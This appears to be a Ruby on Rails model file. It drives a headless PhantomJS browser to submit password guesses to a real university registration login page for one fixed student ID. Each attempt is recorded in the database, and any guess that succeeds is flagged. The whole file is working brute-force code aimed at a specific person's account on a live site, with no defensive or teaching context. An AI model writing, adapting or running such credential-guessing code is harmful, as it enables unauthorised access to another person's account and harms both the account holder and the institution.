class Trial < ActiveRecord::Base
	def self.try_with_password(pass)
		Selenium::WebDriver::PhantomJS.path = Phantomjs.path
		browser = Watir::Browser.new(:phantomjs)
		browser.goto("https://alexreg.aast.edu/aastreg/frm_login.aspx")
		browser.text_field(:id, "ctl00_ContentPlaceHolder1_UserName").set("14102988")
		browser.text_field(:id, "ctl00_ContentPlaceHolder1_Password").set("#{pass}")
		browser.button(name: "ctl00$ContentPlaceHolder1$btn_login").click
		if browser.text.include?("Registration number and your PIN are not allowed to login")
			puts "Failed for #{pass}"
			Trial.create(password:pass)
		else
			puts "Successful for #{pass}"
			Trial.create(password:pass, successful:true)
		end
	rescue => e
	end
end